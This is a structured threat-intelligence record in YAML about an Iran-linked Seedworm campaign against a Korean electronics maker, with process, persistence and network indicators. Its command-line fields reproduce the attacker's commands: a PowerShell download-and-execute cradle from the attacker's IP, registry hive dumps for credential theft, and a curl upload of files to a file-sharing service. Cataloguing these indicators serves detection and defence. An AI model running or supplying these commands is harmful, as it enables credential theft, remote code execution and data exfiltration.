title: 'Seedworm: Iran-Linked Hackers Breached Korean Electronics Maker in Global
  Spying Campaign'
description: Seedworm, an Iranian-linked threat actor, abused signed Fortemedia and
  SentinelOne binaries for DLL sideloading and exfiltrated data through a public file-transfer
  service.
attribution: Seedworm (aka MuddyWater, Temp Zagros, Static Kitten)
malware_families:
- Seedling
cves: []
ttps:
  processes:
  - fmapp.exe
  - sentinelmemoryscanner.exe
  - node.exe
  - powershell.exe
  - curl.exe
  - reg.exe
  - cmd.exe
  command_lines:
  - powershell -NoProfile -Command "iex (New-Object Net.WebClient).DownloadString('http://179.43.177[.]220:8080/nm.ps1')"
  - curl.exe -o CSIDL_PROFILE\appdata\local\[RANDOM]\a.dat http://179.43.177[.]220:8080/a.dat
  - curl.exe -o CSIDL_PROFILE\appdata\local\[RANDOM]\a.exe http://179.43.177[.]220:8080/a.exe
  - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v [RANDOM] /t REG_SZ
    /d "CSIDL_PROFILE\appdata\local\[RANDOM]\fmapp.exe" /f
  - reg save hklm\sam C:\Windows\Temp\sam.save /y
  - reg save hklm\security C:\Windows\Temp\security.save /y
  - reg save hklm\system C:\Windows\Temp\system.save /y
  - powershell -NoProfile -Command "(Invoke-WebRequest -UseBasicParsing http://ipinfo.io/json).Content"
  - curl.exe -F "file=@C:\Windows\Temp\<artifact>" https://sendit.sh
  powershell:
  - iex (New-Object Net.WebClient).DownloadString('http://179.43.177[.]220:8080/nm.ps1')
  - (Invoke-WebRequest -UseBasicParsing http://ipinfo.io/json).Content
  scripts:
  - sp.ps1
  registry_keys: []
  image_loads:
  - fmapp.dll
  - sentinelagentcore.dll
  - example.dll
  network_connections:
  - node.exe -> 179.43.177[.]220:8080
  - curl.exe -> 179.43.177[.]220:8080
  - powershell.exe -> ipinfo.io:80
  - curl.exe -> sendit.sh:443
  file_activity: []
  persistence:
  - Registry Run key (HKCU) pointing at CSIDL_PROFILE\\appdata\\local\\[RANDOM]\\fmapp.exe
  process_relations: []
